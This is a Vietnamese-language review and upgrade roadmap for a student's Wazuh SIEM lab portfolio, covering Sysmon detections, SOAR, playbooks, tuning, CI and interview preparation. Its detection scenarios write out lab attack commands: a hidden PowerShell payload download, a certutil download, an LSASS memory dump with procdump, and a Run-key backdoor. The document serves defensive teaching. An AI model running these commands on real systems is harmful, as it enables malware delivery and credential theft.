# 📋 ĐÁNH GIÁ TỔNG QUAN VÀ LỘ TRÌNH NÂNG CẤP ĐỒ ÁN WAZUH SOC LAB
> **Định vị mục tiêu:** Chuyển hóa đồ án nghiên cứu học thuật thành **Dự án Portfolio chuẩn Enterprise** giúp ứng viên nổi bật trong mắt nhà tuyển dụng và vượt qua các vòng phỏng vấn kỹ thuật vị trí **SOC Analyst (L1/L2)** hoặc **Detection Engineer**.

---

## 📌 PHẦN 1: ĐÁNH GIÁ HIỆN TRẠNG ĐỒ ÁN (CURRENT STATE AUDIT)

### 1.1. Những điểm sáng nổi bật (Strengths đã làm rất tốt)
Đồ án hiện tại đã vượt xa mức một bài thực hành thông thường của sinh viên nhờ các yếu tố:
1. **Kiến trúc bài bản và đóng gói chuẩn Docker:** Triển khai Wazuh Stack (Manager, Indexer, Dashboard) trên Docker Compose single-node, có tinh chỉnh tham số hệ thống nhân Linux (`vm.max_map_count=262144`), phân vùng đĩa cứng (`resizepart/resize2fs`), và giới hạn log container tránh tràn đĩa.
2. **Endpoint Auditing có chiều sâu:** Không chỉ dùng Windows Event Log thuần túy mà đã tích hợp **Microsoft Sysmon v15.2** với file cấu hình tùy biến (`sysmon-config.xml`), cho phép thu thập telemetry chuyên sâu ở tầng nhân (Process, Network, Registry).
3. **Detection Engineering thực thụ:** Đã tự viết **Custom Decoder** (trích xuất regex URL) và **Custom Rules** (Rule 100001 phát hiện Brute Force, Rule 100002 phát hiện Web LFI/Directory Traversal chống bypass double encoding `%252f`), map chuẩn theo framework **MITRE ATT&CK**.
4. **Phòng thủ chủ động (Active Response):** Không dừng lại ở việc sinh alert thụ động mà đã cấu hình lệnh `netsh.exe` tự động can thiệp Windows Defender Firewall để cô lập IP tấn công theo thời gian thực (timeout 600s).
5. **Tự động hóa kiểm thử hồi quy (Phase 4 - Test Automation):** Đây là **điểm đắt giá nhất của đồ án**. Việc xây dựng unit test kiểm tra cú pháp XML (`test_detection_config.py`), kiểm tra sức khỏe cụm 3 VM (`lab_health.py`), và script chạy tấn công tự động + xác thực bằng chứng qua WinRM/SSH (`scenario_rdp_bruteforce.py`) mang tư duy **Detection-as-Code** (DevSecOps), điều mà rất ít ứng viên Junior/Fresher làm được.

---

### 1.2. Khoảng cách (Gap Analysis) so với thực tế vận hành SOC Doanh nghiệp
Dù nền tảng rất vững, đồ án vẫn còn một số "khoảng trống" khiến nhà tuyển dụng SOC kỳ cựu nhận thấy đây vẫn là một lab đóng hộp:

| Tiêu chí đánh giá | Hiện trạng đồ án | Yêu cầu thực tế tại Enterprise SOC |
| :--- | :--- | :--- |
| **Độ bao phủ phát hiện (MITRE ATT&CK)** | Mới có 2 kịch bản: T1110 (Brute Force) và T1190 (LFI/Traversal). | Cần bao phủ chuỗi tấn công hoàn chỉnh (**Full Kill Chain**): Thực thi mã (T1059), Leo thang đặc quyền (T1548), Trích xuất thông tin xác thực (T1003), Ẩn náu (T1547). |
| **Tận dụng Telemetry của Sysmon** | Đã cài Sysmon nhưng 2 kịch bản hiện tại mới chỉ dùng Windows Security Log (Event 4625) và Apache Log. | Sysmon sinh ra để bắt: Event 1 (Process Create), Event 3 (Network), Event 10 (ProcessAccess - LSASS), Event 11 (FileCreate), Event 13 (Registry). Chưa có kịch bản khai thác các event này. |
| **Tự động hóa phản ứng & Cảnh báo (SOAR/ChatOps)** | Alert chỉ nằm trong giao diện Wazuh Dashboard; mục ChatOps còn để ngỏ ("sẽ nghiên cứu trong tương lai"). | SOC hiện đại cần cảnh báo tức thì ra **Telegram/Discord/Slack**, tự động tra cứu danh tiếng mã độc qua **VirusTotal / AbuseIPDB** và tạo ticket. |
| **Quy trình & Tài liệu hóa sự cố (IR Playbook)** | Có file report kỹ thuật từng phase, nhưng chưa có **Incident Response Playbook (SOP)** theo chuẩn NIST/SANS cho SOC Analyst. | SOC Analyst cần biết quy trình: Phân loại mức độ (Triage) -> Cô lập (Containment) -> Diệt trừ (Eradication) -> Khôi phục (Recovery) -> Viết báo cáo điều tra (Incident Report). |
| **Tối ưu hóa cảnh báo & Giảm nhiễu (Tuning)** | Chưa đề cập đến hiện tượng cảnh báo giả (False Positive) và cách whitelist hành vi quản trị hợp lệ. | Một bài toán nhức nhối trong SOC là **Alert Fatigue** (quá tải cảnh báo). Ứng viên cần chứng minh khả năng tuning rule và exception handling. |
| **Định lượng hiệu quả (Metrics & KPIs)** | Chưa có số liệu thống kê thời gian phát hiện và phản ứng. | Cần đo lường **MTTD** (Mean Time to Detect) và **MTTR** (Mean Time to Respond) trước và sau khi có rule/active response. |

---

## 🎯 PHẦN 2: LỘ TRÌNH NÂNG CẤP ĐỂ TẠO ẤN TƯỢNG VƯỢT TRỘI

Dưới đây là 5 hướng nâng cấp cụ thể, được sắp xếp theo mức độ ưu tiên để đưa vào CV.

```
                     ┌────────────────────────────────────────────────────────┐
                     │            LỘ TRÌNH HOÀN THIỆN SOC LAB               │
                     └──────────────────────────┬─────────────────────────────┘
                                                │
         ┌──────────────────────┬───────────────┴───────────────┬──────────────────────┐
         ▼                      ▼                               ▼                      ▼
  [Hướng 1: Detection]   [Hướng 2: SOAR/TI]             [Hướng 3: Quy trình]   [Hướng 4: Tuning]
  Mở rộng Sysmon Rules   ChatOps & Threat Intel         SOC Playbook & SOP     Giảm False Positive
  - LOLBAS / PowerShell  - Telegram / Discord Webhook   - Chuẩn NIST SP 800-61 - Whitelist Admin script
  - LSASS Dumping        - VirusTotal / AbuseIPDB       - Incident Report mẫu  - Tinh chỉnh Threshold
  - Persistence RegKey   - TheHive / Shuffle SOAR       - Phân tích Root Cause - Đo lường MTTD / MTTR
```

---

### 🚀 Hướng 1: Mở rộng Kịch bản Detection Engineering với Sysmon (Ưu tiên cao nhất)
Thay vì chỉ dừng lại ở Web và Đăng nhập mạng, hãy bổ sung các kịch bản bắt trọn hành vi của Malware/Kẻ tấn công sau khi đã xâm nhập vào máy endpoint:

#### Kịch bản A: Phát hiện Thực thi Mã độc & Công cụ Quản trị hợp lệ (LOLBAS & Obfuscated PowerShell)
* **Kỹ thuật MITRE:** `T1059.001 - Command and Scripting Interpreter: PowerShell` & `T1105 - Ingress Tool Transfer`.
* **Hành vi tấn công:** Kẻ tấn công trên Kali dùng PowerShell để download và thực thi file độc hại ẩn danh:
  ```powershell
  powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://192.168.71.130/payload.exe -OutFile C:\Users\Public\payload.exe"
  ```
  Hoặc sử dụng kỹ thuật sống nhờ vào tài nguyên có sẵn (**LOLBAS**): `certutil.exe -urlcache -split -f http://192.168.71.130/malware.exe malware.exe`.
* **Telemetry thu thập:** Sysmon **Event ID 1 (Process Creation)** kết hợp Windows PowerShell **Event ID 4104 (Script Block Logging)**.
* **Quy tắc phát hiện (Custom Rule):**
  - Bắt các command-line flags đáng ngờ: `-enc`, `-EncodedCommand`, `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, `DownloadString`, `certutil -urlcache`.
  - Phân tích mối quan hệ Tiến trình Cha - Con (Parent-Child Relationship): Ví dụ Apache `httpd.exe` hoặc `cmd.exe` đẻ ra `powershell.exe` hoặc `whoami.exe`.

#### Kịch bản B: Phát hiện Đánh cắp Mật khẩu từ Bộ nhớ (Credential Dumping via LSASS)
* **Kỹ thuật MITRE:** `T1003.001 - OS Credential Dumping: LSASS Memory`.
* **Hành vi tấn công:** Kẻ tấn công cố gắng dump bộ nhớ tiến trình `lsass.exe` bằng Mimikatz, ProcDump hoặc Task Manager để lấy hash mật khẩu:
  ```cmd
  procdump.exe -ma lsass.exe C:\Users\Public\lsass.dmp
  ```
* **Telemetry thu thập:** Sysmon **Event ID 10 (ProcessAccess)** - phát hiện tiến trình lạ mở handle truy cập với quyền nguy hiểm (`GrantedAccess` chứa `0x1010` hoặc `0x1F0FFF`) nhắm vào `lsass.exe`.
* **Quy tắc phát hiện (Custom Rule):**
  - Viết rule bắt mọi SourceImage khác với các tiến trình hệ thống hợp lệ (`svchost.exe`, `csrss.exe`) có hành vi đọc bộ nhớ của `TargetImage: C:\Windows\system32\lsass.exe`.

#### Kịch bản C: Phát hiện Thiết lập Trụ sở Ẩn náu (Persistence via Registry Run Key)
* **Kỹ thuật MITRE:** `T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder`.
* **Hành vi tấn công:** Thêm khóa Registry để mã độc tự khởi chạy mỗi khi nạn nhân khởi động máy:
  ```cmd
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
  ```
* **Telemetry thu thập:** Sysmon **Event ID 13 (RegistryEvent - Value Set)**.
* **Quy tắc phát hiện (Custom Rule):**
  - Bắt hành vi tạo/sửa đổi key tại các đường dẫn `...\CurrentVersion\Run` và `...\CurrentVersion\RunOnce`.

---

### 🤖 Hướng 2: Tự động hóa SOAR, Làm giàu Dữ liệu (Threat Intel) & ChatOps
Trong SOC hiện đại, Analyst không bao giờ F5 trang quản trị liên tục. Việc kết nối hệ thống SIEM với kênh thông báo và công cụ phân tích tự động sẽ biến đồ án thành một **Mini-SOC hoàn chỉnh**:

1. **Tích hợp ChatOps cảnh báo thời gian thực (Telegram / Discord):**
   - Viết Python script trong thư mục `integrations/custom-telegram.py` hoặc sử dụng cơ chế `<integration>` có sẵn trong file `ossec.conf` của Wazuh Manager.
   - Định dạng tin nhắn cảnh báo gửi về nhóm Telegram/Discord của SOC:
     ```text
     🚨 [SOC ALERT - HIGH SEVERITY]
     ---------------------------------------
     Rule ID: 100001 (Level 12)
     Tên cảnh báo: Windows RDP Brute Force Detected
     MITRE ATT&CK: T1110 (Brute Force)
     Thời gian: 2026-09-29 14:32:10 UTC
     Source IP: 192.168.71.130 (Attacker)
     Target Host: Windows-Victim (192.168.71.129)
     Trạng thái phản ứng: [ĐÃ CÔ LẬP] Tự động chặn IP 10 phút qua Firewall
     ---------------------------------------
     ```
2. **Làm giàu dữ liệu tự động với Threat Intelligence (TI Enrichment):**
   - **AbuseIPDB Integration:** Khi phát hiện IP lạ tấn công (LFI hoặc Brute Force), script tự động gọi API AbuseIPDB để lấy thông tin điểm tin cậy (Confidence of Abuse Score), quốc gia, nhà mạng ISP và đưa vào chi tiết alert.
   - **VirusTotal Integration:** Khi Sysmon Event 1 hoặc Event 11 ghi nhận một file thực thi mới được tạo, Wazuh tự động đẩy hash SHA256 lên VirusTotal API để kiểm tra xem có phải mã độc đã biết hay không.

3. **Tích hợp Nền tảng Quản lý Sự cố (Case Management - TheHive / Shuffle):**
   - Triển khai thêm container **Shuffle SOAR** (hoặc **TheHive 5**) kết nối với Wazuh.
   - Khi có alert Level >= 10, một ticket sự cố tự động được tạo ra với đầy đủ các artifact (IP, User, Hostname, Process Name, Log thô) để SOC Analyst nhận việc.

---

### 📑 Hướng 3: Xây dựng Bộ Playbook / SOP Ứng phó Sự cố Chuẩn SOC
Một thiếu sót lớn của sinh viên khi phỏng vấn SOC là chỉ biết "bấm tool" nhưng không biết quy trình xử lý sự cố. Việc bổ sung tài liệu Playbook vào repo sẽ chứng minh bạn đã sẵn sàng làm việc ngay từ ngày đầu tiên (**Day-1 Ready**).

Tạo thư mục `playbooks/` trong repo và viết tài liệu theo chu trình **NIST SP 800-61 Rev. 2 / SANS (PICERL)**:

#### Cấu trúc một bản Playbook mẫu cần có trong repo:
* **Playbook 01: Xử lý Tấn công Dò quét Mật khẩu RDP (RDP Brute Force Response)**
  1. **Identification (Xác định):**
     - Kiểm tra Event 4625 trên Windows: Phân tích `Failure Reason` (Status `0xC000006A` - sai pass, Status `0xC0000064` - tài khoản không tồn tại).
     - Phân biệt giữa người dùng quên mật khẩu (1-2 lần) và tấn công Brute Force/Password Spraying (hàng chục lần trong vài giây).
  2. **Containment (Cô lập):**
     - Đánh giá trạng thái Active Response của Wazuh (`netsh advfirewall firewall`).
     - Nếu Active Response thất bại: Hướng dẫn lệnh thủ công cách kill session RDP đang mở và cô lập máy khỏi mạng nội bộ.
  3. **Eradication & Recovery (Diệt trừ & Phục hồi):**
     - Kiểm tra xem kẻ tấn công đã đăng nhập thành công chưa (tìm Event ID 4624 Loại Logon Type 10 ngay sau chuỗi Event 4625).
     - Nếu có đăng nhập thành công: Thực hiện khóa tài khoản khẩn cấp, reset credential, kiểm tra các tiến trình lạ được tạo trong phiên RDP đó.
  4. **Post-Incident Activity (Hậu sự cố):**
     - Đề xuất giải pháp Hardening: Đổi cổng RDP mặc định, bắt buộc dùng Network Level Authentication (NLA), triển khai Account Lockout Policy (khóa tài khoản sau 5 lần thử sai), yêu cầu kết nối qua VPN nội bộ thay vì public cổng 3389.

* **Playbook 02: Xử lý Tấn công Ứng dụng Web & Web Shell (LFI / RCE Incident)**
  1. Phân tích Apache Access Log + Error Log: Xác định URI bị khai thác, HTTP Status Code trả về (200 OK hay 404/403).
  2. Dùng Sysmon kiểm tra xem Web Server process (`httpd.exe` / `php-cgi.exe`) có sinh ra file mới trong thư mục web hay gọi lệnh hệ thống (`cmd.exe /c dir`, `powershell`) không.
  3. Thu hồi quyền truy cập, vá lỗ hổng code PHP (Sanitize input, dùng whitelist file).

---

### 🛡️ Hướng 4: Tinh chỉnh Cảnh báo (Tuning) & Đo lường Chỉ số Hiệu năng SOC
Nhà tuyển dụng rất thích ứng viên hiểu bài toán **False Positive (Báo động giả)**:

1. **Kỹ thuật Whitelist & Tuning Rules:**
   - Trong môi trường thực tế, quản trị viên mạng hoặc phần mềm quét lỗ hổng nội bộ (Nessus, OpenVAS) có thể kích hoạt Rule 100001 hoặc 100002.
   - Thêm vào file `custom-rules/local_rules.xml` một rule cấp thấp (Level 0) để bỏ qua cảnh báo nếu IP nguồn thuộc dải máy quét được cấp phép:
     ```xml
     <rule id="100000" level="0">
       <if_sid>60122</if_sid>
       <srcip>192.168.71.200</srcip> <!-- IP của máy Quản trị hoặc Pentester nội bộ -->
       <description>Bỏ qua log quét RDP từ máy Audit nội bộ</description>
     </rule>
     ```
2. **Đo lường định lượng các chỉ số SOC (Metrics):**
   - **MTTD (Mean Time to Detect):** Thời gian từ khi gói tin tấn công đầu tiên được gửi đến khi Wazuh kích hoạt Alert trên Dashboard (ở lab này: ~1.5 đến 3 giây).
   - **MTTR (Mean Time to Respond):** Thời gian từ khi kích hoạt Alert đến khi tường lửa Windows áp dụng rule chặn IP ngắt hoàn toàn kết nối của kẻ tấn công (ở lab này: ~3 đến 5 giây).
   - Đưa bảng so sánh: **Trước khi có hệ thống** (MTTD: Không xác định / Vài tuần; MTTR: Thủ công) vs **Sau khi có Wazuh + Active Response** (MTTD: <3s; MTTR: <5s; Tự động hóa 100%).

---

### ⚙️ Hướng 5: Nâng tầm CI/CD & Detection-as-Code (Kế thừa Phase 4)
Đồ án đã có file `tests/` rất tốt, hãy nâng cấp nó thành quy trình chuẩn công nghiệp:

1. **Tích hợp GitHub Actions (CI Pipeline):**
   - Thiết lập `.github/workflows/ci.yml` để mỗi khi `git push` rule mới lên GitHub:
     - Tự động chạy `test_detection_config.py` kiểm tra cú pháp XML, tính duy nhất của Rule ID, logic regex.
     - Sử dụng công cụ `wazuh-logtest` (chạy qua Docker container trên GitHub Actions runner) để nạp mẫu log giả lập và kiểm tra xem Rule có trigger đúng Alert ID mong muốn hay không.
2. **Tự động hóa báo cáo kiểm thử:**
   - Xuất kết quả kiểm thử ra file `TEST_REPORT.md` tự động đính kèm vào Pull Request.

---

## 💼 PHẦN 3: CHIẾN LƯỢC ĐƯA VÀO CV VÀ CHINH PHỤC PHỎNG VẤN SOC

### 3.1. Cách viết mục Dự án vào CV (Chuẩn format Google XYZ / STAR)

#### ❌ Cách viết thông thường (Yếu, thiếu số liệu, không gây ấn tượng):
> *Dự án: Lab SOC Wazuh*
> * *Cài đặt Wazuh SIEM trên Ubuntu và cài Agent trên Windows 10.*
> * *Mô phỏng tấn công Brute Force bằng Kali Linux.*
> * *Viết luật phát hiện tấn công và cấu hình chặn IP.*

#### ✅ Cách viết chuyên nghiệp cho CV SOC Analyst / Detection Engineer (Mạnh mẽ, giàu từ khóa ATS):

```markdown
### HỆ THỐNG GIÁM SÁT AN NINH MẠNG TẬP TRUNG & TỰ ĐỘNG PHẢN ỨNG SỰ CỐ (WAZUH SIEM/XDR LAB)
**Vai trò:** Detection Engineer & SOC Analyst | **Công nghệ:** Wazuh SIEM/XDR, Docker, Microsoft Sysmon, Python, MITRE ATT&CK, Active Response, WinRM.
* **Thiết kế & Triển khai:** Xây dựng hạ tầng SIEM/XDR tập trung trên nền tảng Docker với cấu hình Kernel Hardening và mở rộng phân vùng lưu trữ, kết nối giám sát Endpoint Windows 10 thông qua kênh giao tiếp mã hóa TLS.
* **Tối ưu hóa Telemetry Endpoint:** Triển khai Microsoft Sysmon v15.2 tùy biến nhằm kiểm toán hành vi chuyên sâu ở tầng nhân hệ điều hành (Kernel-level events: Process Creation, Network Connections, Handle Access).
* **Kỹ nghệ Phát hiện (Detection Engineering):** Thiết kế Custom Decoders (Regex) và Rules tương quan (Correlation Rules) chuẩn hóa theo framework MITRE ATT&CK, phát hiện thành công các kỹ thuật tấn công RDP Brute Force (T1110) và Web Application LFI/Directory Traversal chống bypass double encoding (T1190).
* **Tự động hóa Ứng phó (Active Response):** Thiết lập cơ chế cô lập mối đe dọa thời gian thực, tự động kích hoạt Windows Defender Firewall (`netsh`) ngăn chặn IP kẻ tấn công, giảm thời gian phản ứng (MTTR) từ xử lý thủ công xuống dưới 5 giây.
* **Quy trình Detection-as-Code & Tự động hóa Kiểm thử:** Xây dựng bộ công cụ Regression Testing độc lập bằng Python (WinRM, SSH, Unittest) tự động hóa quy trình kiểm thử sức khỏe cụm máy chủ và xác thực chuỗi phát hiện - cô lập từ xa, đảm bảo tính ổn định của hệ sinh thái luật.
```

---

### 3.2. Bộ Từ khóa Vàng (Keywords) tối ưu cho bộ lọc tự động ATS
Đảm bảo các thuật ngữ này xuất hiện rải rác trong CV và hồ sơ LinkedIn:
- `SIEM/XDR Architecture`, `Wazuh`, `Sysmon Telemetry`, `Detection Engineering`, `MITRE ATT&CK Mapping`
- `Incident Response (NIST/SANS)`, `Active Response / Automated Containment`, `SOAR`, `ChatOps`
- `Log Analysis & Parsing`, `Custom Decoders & Rules`, `False Positive Tuning`, `Detection-as-Code`
- `Endpoint Detection & Response (EDR)`, `Threat Hunting`, `MTTD / MTTR Optimization`

---

### 3.3. Bộ câu hỏi phỏng vấn thực tế nhà tuyển dụng sẽ hỏi & Chiến lược trả lời

#### Câu 1: "Tại sao bạn lại cần cài thêm Sysmon trong khi Windows đã có sẵn Windows Security Event Logs?"
* **Câu trả lời chuẩn:**
  > "Dạ, Windows Security Event Logs mặc định (như Event ID 4624/4625/4688) rất quan trọng cho kiểm toán xác thực, nhưng có nhiều hạn chế trong việc giám sát hành vi mã độc chuyên sâu. Ví dụ, Event 4688 mặc định không ghi lại đầy đủ đối số dòng lệnh (Command Line Arguments), không ghi nhận chuỗi băm (Hash SHA256) của file thực thi, và không giám sát được các kỹ thuật phức tạp như Process Injection, Process Access vào bộ nhớ LSASS, hay sự thay đổi của Driver. 
  > Sysmon v15.2 hoạt động như một device driver tầng nhân (Kernel-mode), cung cấp các telemetry vô cùng giá trị như Event ID 1 (Process Create kèm Parent-Child tree và Hash), Event ID 3 (Network Connection gắn trực tiếp với Process ID), Event ID 10 (ProcessAccess - cực kỳ hiệu quả để bắt Mimikatz trích xuất bộ nhớ LSASS) và Event ID 13 (Registry modification). Việc kết hợp cả hai giúp Wazuh có bức tranh toàn cảnh mà kẻ tấn công khó có thể lẩn tránh."

#### Câu 2: "Trong Kịch bản 1, bạn cấu hình Active Response chặn IP bằng Firewall trong 600 giây. Tại sao lại là 600 giây mà không chặn vĩnh viễn? Điều gì xảy ra nếu kẻ tấn công giả mạo (Spoof) IP của Gateway hoặc DNS Server nội bộ?"
* **Câu trả lời chuẩn (Thể hiện tư duy vận hành thực tế):**
  > "Dạ, việc thiết lập timeout 600 giây (10 phút) là một thực hành cân bằng rủi ro chuẩn trong SOC:
  > 1. Nó đủ lâu để bẻ gãy đợt tấn công Brute Force tự động của tin tặc và buộc công cụ quét của họ rơi vào trạng thái timeout, trong khi SOC Analyst có thời gian vào điều tra.
  > 2. Chặn tạm thời giúp phòng tránh nguy cơ từ chối dịch vụ tự hủy (Self-DoS). Nếu kẻ tấn công giả mạo IP nguồn của các dịch vụ thiết yếu như Active Directory Domain Controller, Default Gateway, hoặc máy chủ DNS nội bộ, việc chặn vĩnh viễn sẽ làm tê liệt toàn bộ hạ tầng mạng.
  > Trong môi trường sản xuất lớn, chúng ta cần cấu hình Whitelist danh sách các IP hạ tầng quan trọng vào rule Active Response, đồng thời kích hoạt cảnh báo gửi ticket cho SOC Analyst xác minh trước khi thực hiện cô lập vĩnh viễn hoặc cách ly mức Endpoint (Host Isolation)."

#### Câu 3: "Làm thế nào bạn biết một cảnh báo Brute Force là tấn công thật sự hay chỉ là nhân viên gõ sai mật khẩu hoặc một script tự động của IT bị lỗi pass cũ?"
* **Câu trả lời chuẩn (Thể hiện kỹ năng Triage L1/L2):**
  > "Dạ, khi tiếp nhận cảnh báo Event 4625, em sẽ tiến hành quy trình phân loại (Triage) dựa trên các chỉ số:
  > 1. **Tần suất và Tốc độ (Velocity):** Người dùng gõ sai thường chỉ phát sinh 3-5 lần sai trong 1-2 phút. Tấn công tự động (Hydra, xfreerdp) sẽ phát sinh hàng chục đến hàng trăm request chỉ trong vài giây.
  > 2. **Danh sách Username nhắm tới:** Người dùng thật chỉ đăng nhập sai 1 tài khoản của chính họ. Tấn công dò mật khẩu thường thử các tài khoản mặc định (`admin`, `administrator`, `root`, `guest`, `test`) hoặc dùng danh sách từ điển nhiều username khác nhau.
  > 3. **IP nguồn và Workstation Name:** Nếu IP nguồn đến từ dải mạng Public bên ngoài hoặc dải IP lạ, nguy cơ rất cao. Nếu đến từ IP nội bộ của phòng IT hoặc máy của một nhân viên cụ thể, em sẽ kiểm tra xem máy đó có cài task tự động (Scheduled Task/Mapped Drive) đang lưu cache mật khẩu cũ hay không.
  > 4. **Trạng thái Logon Type:** Logon Type 2 (Interactive - ngồi tại máy), Type 3 (Network - SMB), hay Type 10 (RemoteInteractive - RDP) giúp khoanh vùng chính xác vector tiếp cận."

#### Câu 4: "Bạn có thể giải thích ý nghĩa của Phase 4 trong đồ án? Tại sao lại cần viết automation test trong khi hệ sinh thái Wazuh đã có giao diện web để theo dõi?"
* **Câu trả lời chuẩn (Tạo sự khác biệt cực lớn):**
  > "Dạ, Phase 4 giải quyết bài toán cốt lõi của **Detection-as-Code** trong môi trường Agile/DevSecOps:
  > Trong thực tế, khi đội ngũ SOC cập nhật bộ luật mới, nâng cấp phiên bản Wazuh, hoặc thay đổi chính sách thu thập log của Sysmon, rất dễ xảy ra hiện tượng **Hồi quy (Regression)** — tức là một thay đổi mới vô tình làm hỏng các luật phát hiện cũ mà không ai hay biết cho đến khi sự cố thực sự xảy ra.
  > Thay vì phải bật máy ảo, gõ lệnh thủ công và nhìn màn hình bằng mắt để kiểm tra lại hệ thống sau mỗi lần update, em xây dựng bộ script Python kiểm thử tự động 3 bước:
  > - Kiểm tra tĩnh (Static linting) cấu trúc XML của Rule và Decoder.
  > - Kiểm tra động (Health check) trạng thái hoạt động của toàn bộ hạ tầng đa nền tảng (Linux SSH, Windows WinRM, Docker containers, Indexer cluster).
  > - Tự động phát động kịch bản tấn công có kiểm soát và xác thực bằng chứng đa điểm (Windows Event Viewer, Log Active Response, Alert JSON trên Manager) để xuất ra kết quả PASS/FAIL độc lập. Quy trình này giúp bộ luật phát hiện luôn được kiểm chứng liên tục và có thể tích hợp thẳng vào CI/CD pipeline."

---

## 📅 PHẦN 4: CHECKLIST HÀNH ĐỘNG NÂNG CẤP (ACTION PLAN)

Dưới đây là các đầu việc bạn có thể thực hiện theo từng tuần để hoàn thiện đồ án:

### Giai đoạn 1: Quick Wins (Làm được ngay trong 1-2 ngày)
- [ ] Bổ sung thư mục `playbooks/` chứa 2 tài liệu SOP mẫu: `SOP-01_RDP_Brute_Force.md` và `SOP-02_Web_LFI_Mitigation.md`.
- [ ] Bổ sung phần **Threat Intelligence Integration** cho Wazuh Manager: Cấu hình API key miễn phí của VirusTotal trong `ossec.conf` để tự động tra cứu mã băm file.
- [ ] Viết script `integrations/telegram-alert.py` để bắn cảnh báo ra một bot Telegram cá nhân mỗi khi Rule 100001 hoặc 100002 được kích hoạt. Chụp ảnh minh chứng đưa vào báo cáo.

### Giai đoạn 2: Mở rộng Kịch bản (3-5 ngày)
- [ ] Triển khai **Kịch bản 3**: Bắt hành vi thực thi mã độc qua PowerShell / LOLBAS (`certutil` download payload) sử dụng telemetry của **Sysmon Event ID 1**. Viết rule `100003` và bổ sung test case tương ứng.
- [ ] Triển khai **Kịch bản 4**: Bắt hành vi dump bộ nhớ `lsass.exe` bằng Sysmon **Event ID 10**. Viết rule `100004`.
- [ ] Cập nhật file `tests/test_detection_config.py` để bổ sung unit test cho rule `100003` và `100004`.

### Giai đoạn 3: Đóng gói Portfolio & Chuẩn bị Phỏng vấn (1-2 ngày)
- [ ] Tạo file sơ đồ tổng thể hệ thống (Architecture Diagram) bao gồm cả luồng Active Response, ChatOps, và Threat Intel.
- [ ] Cập nhật lại file `README.md` chính để liên kết đến file `SUMMARY.md` và các Playbook mới.
- [ ] Chuẩn bị một đoạn video ngắn 2-3 phút hoặc file GIF quay lại cảnh: Tấn công từ Kali -> Alert nhảy trên Telegram/Dashboard -> Firewall tự động chặn IP -> Chạy test automation báo PASS. Đưa link video vào CV/README.

---
*Tài liệu này được biên soạn nhằm chuẩn hóa toàn diện đồ án theo tiêu chuẩn vận hành thực tế của một Trung tâm Điều hành An ninh mạng (Enterprise SOC).*
